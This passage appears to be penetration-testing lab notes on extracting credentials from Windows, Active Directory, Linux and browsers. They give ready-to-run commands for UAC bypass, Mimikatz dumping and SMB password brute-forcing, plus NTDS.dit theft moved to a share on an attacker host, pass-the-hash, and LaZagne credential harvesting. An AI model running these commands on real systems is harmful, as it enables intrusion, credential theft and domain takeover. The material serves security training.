It is possible to export Windows Vaults to .crd files either via Control Panel or with the following command:

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

</details>

<details>
<summary><h3>Enumerating credentials with cmdkey</h3></summary>

We can use [cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) to enumerate the credentials stored in the current user's profile:

If you're using xFreeRDP, you can share [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master) with the remote system by mounting a local folder as a shared drive:

```bash
xfreerdp /v:<TARGET_IP> /u:'<USER>' /p:'<PASSWORD>' /drive:share,/home/<USER>/mimikatz
```

> This command maps the local /home/<USER>/mimikatz directory to a drive named share on the remote desktop session, allowing easy access to the Mimikatz binaries from within the RDP environment.

1. **Verify the current user**

```cmd
whoami
```

2. **Enumerate the credentials**

```cmd
cmdkey /list
```

Expected output

Currently stored credentials:

```cmd
Target: WindowsLive:target=virtualapp/didlogical
Type: Generic
User: 02hejubrtyqjrkfi
Local machine persistence

Target: Domain:interactive=SRV01\herman
Type: Domain Password
User: SRV01\herman
```

Stored credentials are listed with the following format:

| Key          | Value Description |
|--------------|-------------------|
| **Target**   | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier. |
| **Type**     | The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons. |
| **User**     | The user account associated with the credential. |
| **Persistence** | Indicates whether a credential is saved persistently on the computer. Credentials marked with `Local machine` persistence survive reboots. |

3. **Use runas to impersonate the stored user like so**

```cmd
runas /savecred /user:SRV01\herman cmd
```

4. **UAC Bypass Techniques**

Option 1: FodHelper Exploit

```cmd
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
```

Option 2: ComputerDefaults Exploit 

```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```

5. **Navigating to Administrator Profile**

```cmd
cd C:\Users\Administrator
```

6. **Clear registry modifications post-exploitation**

```cmd
reg delete HKCU\Software\Classes\ms-settings /f
```

</details>

<details>
<summary><h3>Extracting credentials with Mimikatz</h3></summary>

**Launch Mimikatz**

```cmd
mimikatz.exe
```

**Enable Debug Privileges**

```cmd
mimikatz # privilege::debug
```

**Dump Credential Manager Secrets**

```cmd
mimikatz # sekurlsa::credman
```

> **NOTE:**  Some other tools which may be used to enumerate and extract stored credentials included **SharpDPAPI**, **LaZagne**, and **DonPAPI**.

</details>

</details>

<details>
<summary><h2>Attacking Active Directory and NTDS.dit</h2></summary>

Active Directory (AD) serves as the foundational directory service in over 90% of enterprise Windows environments, managing identity, access, and policy across networked systems.

In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.

<details>
<summary><h3>Dictionary attacks against AD accounts using NetExec</h3></summary>

When a dictionary attack is appropriate, tailoring it to the target organization can improve results. Searching social media and the company’s website for employee directories can help identify staff names. Since most employees receive a username early on—and many organizations follow common naming conventions—this information can guide our attack.

> **NOTE:** Conducting these attacks over the network can be quite noisy and easy to detect, as they often generate significant network traffic and trigger alerts on the target system. Additionally, repeated login attempts may be blocked due to Group Policy restrictions, such as account lockout policies.

Here are a few typical patterns to consider:


| **Username Convention**           | **Practical Example for Jane Jill Doe** |
| --------------------------------- | --------------------------------------- |
| firstinitiallastname              | jdoe                                    |
| firstinitialmiddleinitiallastname | jjdoe                                   |
| firstnamelastname                 | janedoe                                 |
| firstname.lastname                | jane.doe                                |
| lastname.firstname                | doe.jane                                |
| nickname                          | doedoehacksstuff                        |

Often, an email address's structure will give us the employee's username (structure: username@domain). For example, from the email address jdoe@domain.com, we can infer that jdoe is the username.

<details>
<summary><h4>Advice: OSINT-Driven Username Enumeration Techniques</h4></summary>

A common tactic for discovering corporate username formats involves leveraging publicly available information through strategic searches:

1. **Email Discovery via Search Engines**

Querying `@exampledomain.com` on Google often reveals valid email formats from:

* Employee directories
* Press releases
* Conference attendee lists
* GitHub commits (if corporate emails are exposed)

2. **Social Media Scraping**

Tools like LinkedIn Scraper or theHarvester can correlate names/roles with email patterns.

3. **Document Metadata Analysis**

Search `site:exampledomain.com filetype:pdf` to find:

* Author fields in PDF properties (often contains internal usernames)
* Watermarks in internal docs

</details>

<details>
<summary><h4>Creating a custom list of usernames</h4></summary>

After gathering employee names from OSINT research (e.g., LinkedIn, company websites), create a formatted username list for spraying attacks. For this demonstration, we’ll use a small sample set:

* Ben Williamson  
* Bob Burgerstien  
* Jim Stevenson  
* Jill Johnson  
* Jane Doe  

```bash
nano ~/names.txt
```

We can create a custom list using an automated list generator such as [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.

**Install**

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
chmod +x username-anarchy
```

**Usage**

```bash
./username-anarchy -i ~/names.txt > ~/usernames.txt
```

> While automated tools accelerate list generation, investing time in identifying an organization’s exact username convention significantly improves attack success rates.

</details>

<details>
<summary><h4>Enumerating valid usernames</h4></summary>

Before initiating password-based attacks, verifying username validity prevents wasted effort on non-existent accounts. Kerbrute streamlines this process.

**Install**

```bash
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
sudo mv kerbrute /usr/local/bin/
```

**Usage**

```bash
kerbrute userenum --dc <DC IP> -d exampledomain.local ~/usernames.txt
```

Example output

```bash
# ...
# 2025/04/25 09:17:10 >  Using KDC(s):
# 2025/04/25 09:17:10 >   <DC IP>:<PORT>

# 2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@exampledomain.local
# ...
```

</details>

<details>
<summary><h4>Launching a brute-force attack</h4></summary>

Once we've identified the naming convention and gathered employee names or prepared a username list, we can launch a brute-force attack against the target Domain Controller using a tool like NetExec. By leveraging the SMB protocol, we can send logon attempts directly to the DC. 

**Option 1: crackmapexec**

Wordlist

```bash
crackmapexec smb <DC IP> -u ~/usernames.txt -p /usr/share/wordlists/fasttrack.txt | grep "+"
```

Username

```bash
crackmapexec smb <DC IP> -u john -p /usr/share/wordlists/fasttrack.txt | grep "+"
```

**Option 2: netexec**

**Usage**

```bash
netexec smb <DC IP> -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

Example output

```bash
# SMB         <DC IP>     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [+] exampledomain.local\bwilliamson:P@55w0rd! 
```

In this example, NetExec uses SMB to attempt a login as user bwilliamson (-u) with a password list (-p) of common passwords located at `/usr/share/wordlists/fasttrack.txt`. Be aware that if an account lockout policy is in place, this attack could lock the targeted account.

> **NOTE:** Understanding what artifacts an attack leaves behind is key to providing impactful remediation advice. On any Windows system, administrators can use Event Viewer to review Security logs and examine recorded actions. This insight can guide the implementation of stronger security controls and support post-breach investigations.

Once credentials are obtained, we can attempt to gain remote access to the Domain Controller and extract the `NTDS.dit` file, which contains password hashes for all domain users.

</details>

</details>

<details>
<summary><h3>Capturing NTDS.dit</h3></summary>

NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. The `NTDS.dit` file, located at `%systemroot%\NTDS` on domain controllers, is the core database of Active Directory—“.dit” stands for Directory Information Tree. This file contains all domain usernames, password hashes, and critical schema data. If an attacker captures it, they could potentially compromise every account in the domain.

We have two options to obtain this file:


<details>
<summary><h4>Option 1: Automatic</h4></summary>

Using crackmapexec to capture NTDS.dit

```bash
crackmapexec smb <DC IP> -u <USER> -p '<PASSWORD>' --ntds drsuapi
```

Example output

```bash
# [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
# SMB         <DC IP>   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
# SMB         <DC IP>   445    ILF-DC01         [+] ILF.local\<USER>:<PASSWORD> (Pwn3d!)
# SMB         <DC IP>   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
# SMB         <DC IP>   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
# SMB         <DC IP>   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# SMB         <DC IP>   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
# SMB         <DC IP>   445    ILF-DC01         ILF.local\<USER>:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
# SMB         <DC IP>   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
# SMB         <DC IP>   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
# SMB         <DC IP>   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
# SMB         <DC IP>   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ad36b2c78047b7d2b6c64a17225ed0c8:::
# SMB         <DC IP>   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
# SMB         <DC IP>   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC IP>_2025-07-10_115224.ntds of which 7 were added to the database
# SMB         <DC IP>   445    ILF-DC01         [*] To extract only enabled accounts from the output file, run the following command:
# SMB         <DC IP>   445    ILF-DC01         [*] cat /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC IP>_2025-07-10_115224.ntds | grep -iv disabled | cut -d ':' -f1
# SMB         <DC IP>   445    ILF-DC01         [*] grep -iv disabled /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC IP>_2025-07-10_115224.ntds | cut -d ':' -f1
```

Then, we can save the hashes in a file. For example, `hashes_ntlm.txt`.

```bash
cat <FILE.NTDS> | cut -d ':' -f4 | sort -u > hashes_ntlm.txt
```

</details>

<details>
<summary><h4>Option 2: Manual</h4></summary>

<details>
<summary><h5>Connecting to a DC with Evil-WinRM</h5></summary>

We can connect to a target DC using the credentials we captured.

```bash
evil-winrm -i <DC IP>  -u <USERNAME> -p <PASSWORD>
```

> Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.

</details>

<details>
<summary><h5>Checking local group membership</h5></summary>

Once connected, we can check to see what privileges this user has. 

```bash
*Evil-WinRM* PS C:\> net localgroup
```

We also will want to check what domain privileges we have.

```bash
*Evil-WinRM* PS C:\> net user <USERNAME>
```

We're checking whether the account has administrative privileges. To copy the `NTDS.dit` file, the account must have local administrator (Administrators group) or domain administrator (Domain Admins group) — or equivalent — privileges.

This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the `NTDS.dit` file.

</details>

<details>
<summary><h5>Creating shadow copy of C:</h5></summary>

We can use vssadmin to create a [Volume Shadow Copy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (VSS) of the C: drive or whatever volume the admin chose when initially installing AD.

```bash
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

Expected output

```bash
# vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
# (C) Copyright 2001-2013 Microsoft Corp.

# Successfully created shadow copy for 'C:\'
#     Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
#     Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

> It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location.

> We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down.

</details>

<details>
<summary><h5>Copying NTDS.dit from the VSS</h5></summary>

We can then copy the `NTDS.dit` file from the volume shadow copy of the C: drive to another location on the system, preparing it for transfer to our attack host.

```bash
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Then, transfer the files from the target machine to the attack machine

**Attack Machine:** Create a share with smbserver

```bash
mkdir ~/ntds
sudo smbserver.py -smb2support share ~/ntds
```

**Target Machine:** Transfer the hive copies to the share

```bash
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACKER IP>\share 
```

</details>

<details>
<summary><h5>Extracting hashes from NTDS.dit</h5></summary>

With a copy of NTDS.dit on our attack host, we can go ahead and dump the hashes. One way to do this is with Impacket's secretsdump:

```bash
cd ~/ntds
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

Then, we can save the hashes in a file. For example, `hashes_ntlm.txt`.

</details>

</details>

</details>

<details>
<summary><h3>Cracking hashes and gaining credentials</h3></summary>

In many of the techniques we've covered, we've successfully cracked the hashes we've obtained.

```bash
sudo hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt
```

But what happens if we're unable to crack a hash?

</details>

<details>
<summary><h3>Pass the Hash (PtH)</h3></summary>

We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target.

```bash
evil-winrm -i <DC IP> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

</details>

</details>

<details>
<summary><h2>Credential Hunting in Windows</h2></summary>

Once we gain access to a Windows machine—via GUI or command line—credential hunting becomes a valuable technique. It involves thoroughly searching the file system and various applications to uncover stored credentials that can be leveraged for further access or privilege escalation.

<details>
<summary><h3>Search-centric</h3></summary>

Users may store passwords in files on the system, and default credentials might also be present. Tailoring our search based on how the system is used can improve our chances of finding valuable credentials.

> What might an IT admin be doing on a day-to-day basis and which of those tasks may require credentials?

Here are some helpful key terms we can use that can help us discover some credentials:

* Passwords
* Passphrases
* Keys
* Username
* User account
* Creds
* Users
* Passkeys
* configuration
* dbcredential
*  dbpassword
* pwd
* Login
* Credentials

</details>

<details>
<summary><h3>Search tools</h3></summary>

<details>
<summary><h4>Windows Search</h4></summary>

With GUI access, it's worth using Windows Search to look for files containing relevant keywords. By default, it searches both OS settings and the file system for files and applications matching the entered terms, making it a quick way to uncover potential credential artifacts.

</details>

<details>
<summary><h4>LaZagne</h4></summary>

We can also leverage third-party tools like [LaZagne](https://github.com/AlessandroZ/LaZagne) to quickly uncover credentials stored insecurely by web browsers and other applications. LaZagne uses modular components, each designed to extract passwords from specific software.

Some of the common modules are described in the table below:

| Module     | Description                                                                                              |
|------------|----------------------------------------------------------------------------------------------------------|
| browsers   | Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera          |
| chats      | Extracts passwords from various chat applications including Skype                                         |
| mails      | Searches through mailboxes for passwords including Outlook and Thunderbird                               |
| memory     | Dumps passwords from memory, targeting KeePass and LSASS                                                  |
| sysadmin   | Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP         |
| windows    | Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more                 |
| wifi       | Dumps WiFi credentials                                                                                    |

>**NOTE:** Web browsers are some of the most interestings placed to search for credentials, due to the fact that many of them offer built-in credential storage.

>**NOTE:** In the most popular browsers, such as Google Chrome, Microsoft Edge, and Firefox, stored credentials are encrypted. However, many tools for decrypting the various credentials databases used can be found online, such as firefox_decrypt and decrypt-chrome-passwords.

It's a good practice to keep the latest [LaZagne executable](https://github.com/AlessandroZ/LaZagne/releases/) on our attack host, allowing us to quickly transfer it to the target system when needed.

**Target Machine: Run LaZagne**

```cmd
start LaZagne.exe all
```

Expected output

```cmd
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

</details>

<details>
<summary><h4>findstr</h4></summary>

We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

</details>

</details>

<details>
<summary><h4>Additional considerations</h4></summary>

There are countless tools and keywords available for credential hunting on Windows systems, but our approach should be guided by the system's role. A **Windows Server** may require a different strategy than a **Windows Desktop**. Being mindful of how the system is used helps us focus our search. In some cases, simply navigating and listing directories while tools run can reveal stored credentials.

Here are some other places we should keep in mind when credential hunting:

* Passwords in Group Policy in the SYSVOL share
* Passwords in scripts in the SYSVOL share
* Password in scripts on IT shares
* Passwords in web.config files on dev machines and IT shares
* Password in unattend.xml
* Passwords in the AD user or computer description fields
* KeePass databases (if we are able to guess or crack the master password)
* Found on user systems and shares
* Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint

</details>

</details>

</details>

---

<details>
<summary><h1>🐧 Extracting Passwords from Linux Systems</h1></summary>

<details>
<summary><h2>Linux Authentication Process</h2></summary>

**Linux Authentication: PAM Architecture**

Linux systems primarily authenticate users through Pluggable Authentication Modules (PAM), a modular framework that centralizes authentication processes. Key components include:

**Core PAM Modules**

* `pam_unix.so`/`pam_unix2.so`:

    * Handle traditional Unix authentication (`/etc/passwd`, `/etc/shadow`)

    * Manage password changes and session setup

    * Default location: `/usr/lib/x86_64-linux-gnu/security`/ (Debian/Ubuntu)

**Authentication Workflow**

1. User Verification:

    * Validates credentials against system databases

    * Enforces password policies (aging, complexity)

2. Session Management:

    * Logs successful/attempted logins (`/var/log/auth.log`)

    * Applies resource limits (ulimit)

**Security Implications**

* Configuration: Defined in `/etc/pam.d/` (e.g., sshd, sudo)

* Customization: Supports LDAP/AD integration via `pam_ldap.so`

<details>
<summary><h3>Passwd file</h3></summary>

The /etc/passwd file contains information about every user on the system and is readable by all users and services. Each entry in the file corresponds to a single user and consists of seven fields, which store user-related data in a structured format. These fields are separated by colons (:). As such, a typical entry may look something like this:

```bash
john:x:1000:1000:,,,:/home/john:/bin/bash
```

| Field           | Value               |
|-----------------|---------------------|
| Username        | john                |
| Password        | x                   |
| User ID         | 1000                |
| Group ID        | 1000                |
| GECOS           | ,,,                 |
| Home directory  | /home/john          |
| Default shell   | /bin/bash           |

The most important field for our purposes in the `/etc/passwd` file is the password field, which can contain different types of entries. On very old systems, this field may hold the actual password hash, but on modern systems, password hashes are stored in /etc/shadow, which we’ll examine later.

Since `/etc/passwd` is world-readable, if hashes are present here, they can be cracked by an attacker. Typically, you'll see an **x** in the password field, indicating that the actual password hash is in `/etc/shadow`.

However, if `/etc/passwd` is writable—which is a misconfiguration—an attacker could modify the file, such as by removing the password for the root user entirely:

```bash
head -n 1 /etc/passwd
```

Expected output

```bash
# root::0:0:root:/root:/bin/bash
```

This results in no password prompt being displayed when attempting to log in as root.

```bash
su
```

Expected output

```bash
# root@john[/john]#
```

Although the scenarios described are rare, we should still pay attention and watch for potential security gaps, as there are applications that require specific permissions fon entire folders.

</details>

<details>
<summary><h3>Shadow file</h3></summary>

To better protect password hashes, the `/etc/shadow` file was introduced. While it follows a format similar to `/etc/passwd`, its sole purpose is to securely store and manage password information. It contains the password data for all valid user accounts—if a user listed in `/etc/passwd` has no corresponding entry in `/etc/shadow`, that account is considered invalid.

The `/etc/shadow` file is only readable by users with administrative privileges, reducing the risk of unauthorized access. Each line in the file represents a user and is divided into nine fields, including the username, hashed password, and password policy information.

```bash
# john:$y$j9T$3QSBB6CbHEu...f8Ms:18955:0:99999:7:::
```

| Field             | Value                                      |
|-------------------|--------------------------------------------|
| Username          | john                                |
| Password          | `$y$j9T$3QSBB6CbHEu...f8Ms`         |
| Last change       | 18955                                      |
| Min age           | 0                                          |
| Max age           | 99999                                      |
| Warning period    | 7                                          |
| Inactivity period | -                                          |
| Expiration date   | -                                          |
| Reserved field    | -                                          |

If the Password field contains a character such as ! or *, the user cannot log in using a Unix password. However, other authentication methods—such as Kerberos or key-based authentication—can still be used. The same applies if the Password field is empty, meaning no password is required for login.
The Password field also follows a particular format, from which we can extract additional information:

```bash
# $<id>$<salt>$<hashed>
```

As we can see here, the hashed passwords are divided into three parts. The ID value specifies which cryptographic hash algorithm was used, typically one of the following:

| ID   | Cryptographic Hash Algorithm |
|------|-------------------------------|
| 1    | MD5                           |
| 2a   | Blowfish                      |
| 5    | SHA-256                       |
| 6    | SHA-512                       |
| sha1 | SHA1crypt                     |
| y    | Yescrypt                      |
| gy   | Gost-yescrypt                 |
| 7    | Scrypt                        |

Many Linux distributions, including Debian, now use yescrypt as the default hashing algorithm. On older systems, however, we may still encounter other hashing methods that can potentially be cracked.

</details>

<details>
<summary><h3>Opasswd</h3></summary>

The PAM library (pam_unix.so) can prevent users from reusing old passwords. These previous passwords are stored in the /etc/security/opasswd file. Administrator (root) privileges are required to read this file, assuming its permissions have not been modified manually.

```bash
sudo cat /etc/security/opasswd
```

Expected output

```bash
# cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

The presence of multiple cry0l1t3 entries with MD5 ($1$) hashes in the file reveals critical security concerns. 

* MD5 ($1$) is cryptographically broken (collisions since 2004)
* No salting in legacy implementations (pre-2008 Linux)

This is particularly important when identifying old passwords and recognizing patterns, as users often reuse similar passwords across multiple services or applications. Recognizing these patterns can greatly improve our chances of correctly guessing the password.

</details>

<details>
<summary><h3>Cracking Linux Credentials</h3></summary>

Once we have root access on a Linux system, we can extract user password hashes and attempt to crack them to recover plaintext passwords. A useful tool for this is **[unshadow](https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c)**, included with John the Ripper (JtR). It combines the `/etc/passwd` and `/etc/shadow` files into a single file format suitable for cracking.

```bash
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
sudo unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

This "unshadowed" file can now be attacked with either JtR or hashcat

```bash
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o /tmp/unshadowed.cracked
```

Display the results

```bash
cat /tmp/unshadowed.cracked
```

Expected output

```bash
# $6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:mariposa
# $6$0XiU8Oe/pGpxWvdq$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:Martin1
```

</details>

</details>

<details>
<summary><h2>Credential Hunting in Linux</h2></summary>

Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes.

We can imagine that we have successfully gained access to a system via a vulnerable web application and have therefore obtained a reverse shell, for example. Therefore, to escalate our privileges most efficiently, we can search for passwords or even whole credentials that we can use to log in to our target.

There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:

* **Files** including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
* **History** including logs, and command-line history
* **Memory** including cache, and in-memory processing
* **Key-rings** such as browser stored credentials

Enumerating all these categories will allow us to increase the probability of successfully finding out - with some ease - credentials of existing users on the system.

Every environment is different, so our approach should adapt to the specific circumstances. Most importantly, we must understand how the system functions, its purpose, and its role within the broader business logic and network. Keeping this big-picture perspective helps guide effective and context-aware decision-making.

<details>
<summary><h3>Files</h3></summary>

A core principle of Linux is that everything is a file, so it's essential to apply this mindset when searching for valuable data. We should identify and inspect files based on specific categories relevant to our objectives. Key file types to examine include:

* Configuration files
* Databases
* Notes
* Scripts
* Cron jobs
* SSH keys

**Searching for configuration files**

Configuration files (`.config`, `.conf`, `.cnf`) are the core of the functionality of services on Linux distributions.

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

**Searching configuration files for three words (user, password, pass) in each file with the file extension `.cnf`**

Often they even contain credentials that we will be able to read.

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

**Searching for databases**

We can apply this simple search to the other file extensions as well.

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

**Searching for notes**

These often include lists of many different access points or even their credentials.

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

**Searching for scripts**

Scripts are files that often contain highly sensitive information and processes.

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

**Enumerating cronjobs**

Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs.

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.*/
```

**Enumerating cronjobs**

We are interested in the files that store users' command history and the logs that store information about system processes.

```bash
tail -n5 /home/*/.bash*
```

**Enumerating log files**

Here are some strings we can use to find interesting content in the logs:

```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

An essential concept of Linux systems is log files that are stored in text files. The entirety of log files can be divided into four categories:

* Application logs
* Event logs
* Service logs
* System logs

Many different logs exist on the system:

| File                  | Description                                      |
|-----------------------|--------------------------------------------------|
| `/var/log/messages`   | Generic system activity logs                     |
| `/var/log/syslog`     | Generic system activity logs                     |
| `/var/log/auth.log`   | (Debian) All authentication related logs         |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs  |
| `/var/log/boot.log`   | Booting information                              |
| `/var/log/dmesg`      | Hardware and drivers related information and logs|
| `/var/log/kern.log`   | Kernel related warnings, errors and logs         |
| `/var/log/faillog`    | Failed login attempts                            |
| `/var/log/cron`       | Information related to cron jobs                 |
| `/var/log/mail.log`   | All mail server related logs                     |
| `/var/log/httpd`      | All Apache related logs                          |
| `/var/log/mysqld.log` | All MySQL server related logs                    |

</details>

<details>
<summary><h3>Memory and cache</h3></summary>

<details>
<summary><h4>Mimipenguin</h4></summary>

[Mimipenguin](https://github.com/huntergregal/mimipenguin) is a post-exploitation utility designed to extract cached credentials from Linux systems by targeting sensitive memory and file storage locations. It can retrieves credentials for:

* **Logged-in users** (GNOME/KDE sessions)
* **Web browsers** (Chrome, Firefox stored passwords)
* **System services** (SSH keys, sudo tokens)

**Install**

```bash
git clone https://github.com/huntergregal/mimipenguin
cd mimipenguin/
sudo ./mimipenguin.sh 
```

**Usage: Python**

```bash
sudo ./mimipenguin.py
```

**Usage: Bash**

```bash
sudo ./mimipenguin.sh 
```

</details>

<details>
<summary><h4>LaZagne</h4></summary>

An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is LaZagne. This tool allows us to access far more resources and extract the credentials. 

**Install**

```bash
git clone https://github.com/AlessandroZ/LaZagne
cd LaZagne/
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
cd Linux/
```

**Usage**

```bash
sudo python3 laZagne.py all
```

The passwords and hashes we can obtain come from the following sources but are not limited to:

* Wifi
* Wpa_supplicant
* Libsecret
* Kwallet
* Chromium-based
* CLI
* Mozilla
* Thunderbird
* Git
* ENV variables
* Grub
* Fstab
* AWS
* Filezilla
* Gftp
* SSH
* Apache
* Shadow
* Docker
* Keepass
* Mimipy
* Sessions
* Keyrings

</details>

</details>

</details>

</details>

---

<details>
<summary><h1>🕸️ Extracting Passwords from Browsers</h1></summary>

<details>
<summary><h2>Firefox</h2></summary>

<details>
<summary><h3>Stored credentials</h3></summary>

```bash
ls -l .mozilla/firefox/ | grep default
```

```bash
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

</details>

<details>
<summary><h3>firefox_decrypt</h3></summary>

